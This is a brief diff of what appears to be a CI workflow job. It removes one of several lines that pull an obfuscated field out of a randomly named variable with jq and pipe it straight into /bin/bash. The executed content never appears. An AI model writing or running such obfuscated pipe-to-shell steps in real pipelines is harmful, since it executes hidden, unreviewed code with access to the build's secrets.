@@ -47,7 +47,6 @@ jobs:
           printf '%s' "$asx4383" | jq -r .chrbe1 | /bin/bash
           printf '%s' "$ebwm172" | jq -r .esqz0 | /bin/bash
           echo $ek0497 | jq -r .trc4738 | /bin/bash
-          echo $srjk540 | jq -r .bcej8 | /bin/bash
           echo $cvql777 | jq -r .dktth496 | /bin/bash
           printf '%s' "$jn294" | jq -r .svay95 | /bin/bash
           echo $zi0585 | jq -r .w521 | /bin/bash
